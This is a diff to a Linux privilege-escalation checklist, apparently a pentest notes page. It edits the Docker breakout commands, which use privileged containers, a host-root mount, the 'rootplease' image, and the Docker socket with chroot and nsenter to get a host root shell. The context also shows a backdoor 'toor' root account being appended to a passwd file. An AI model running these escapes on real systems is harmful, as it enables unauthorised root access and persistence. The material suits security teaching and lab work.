@@ -181,7 +181,7 @@ $> echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /mnt
 
 **Linux Privilege Escalation: Full Checklist**
 
-```powershell
+```bash
 docker run --rm -it --pid=host --net=host --privileged -v /:/host ubuntu bash
 ```
 
@@ -194,7 +194,7 @@ docker run --rm -it --pid=host --net=host --privileged -v /:/host ubuntu bash
 
 **Linux Privilege Escalation: Full Checklist**
 
-```powershell
+```bash
 $ docker run -v /:/hostOS -i -t chrisfosterelli/rootplease
 latest: Pulling from chrisfosterelli/rootplease
 2de59b831a23: Pull complete 
@@ -221,9 +221,11 @@ uid=0(root) gid=0(root) groups=0(root)
 
 **Linux Privilege Escalation: Full Checklist**
 
-```powershell
-sudo docker -H unix:///google/host/var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
-sudo docker -H unix:///google/host/var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
+```bash
+# Check locally cached images first on offline labs (no Docker Hub access):
+docker -H unix:///var/run/docker.sock images
+docker -H unix:///var/run/docker.sock run -v /:/host -it <LOCAL_IMAGE> chroot /host /bin/bash
+docker -H unix:///var/run/docker.sock run -it --privileged --pid=host <LOCAL_IMAGE> nsenter -t 1 -m -u -n -i sh
 ```
 
 {/* VAULT_ORIGINAL_LINK_START */}
@@ -264,6 +266,8 @@ sudo docker compose up -d
 - [Official documentation 1](https://docs.docker.com/reference/cli/docker/inspect/)
 
 {/* VAULT_RELATED_START */}
+
+---
 
 **Source material and related references**
 
